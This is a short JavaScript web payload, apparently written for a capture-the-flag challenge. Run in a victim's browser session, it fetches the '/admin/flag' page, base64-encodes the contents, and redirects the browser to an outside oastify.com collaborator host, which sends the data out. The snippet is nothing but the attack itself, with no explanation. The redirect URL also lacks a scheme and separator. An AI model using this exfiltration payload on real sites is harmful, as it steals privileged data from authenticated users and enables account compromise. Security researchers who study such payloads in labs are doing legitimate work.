fetch('/admin/flag')
  .then(r => r.text())
  .then(f => location = '3cg7t2px5z6hjrq404x6flrcc3iu6oud.oastify.com' + btoa(f));
